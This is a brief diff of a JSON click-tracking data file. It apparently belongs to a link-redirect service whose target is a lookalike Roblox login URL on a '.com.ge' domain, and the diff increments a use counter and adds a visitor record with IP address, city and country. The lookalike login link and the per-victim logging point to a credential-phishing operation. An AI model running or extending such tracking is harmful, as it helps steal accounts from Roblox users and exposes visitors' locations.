@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1236,
+    "useCount": 1237,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10032,6 +10032,14 @@
         "city": "Chiclayo",
         "flag": "🇵🇪",
         "countryCode": "PE"
+      },
+      {
+        "timestamp": 1777333119582,
+        "ip": "174.195.81.105",
+        "country": "United States",
+        "city": "San Francisco",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
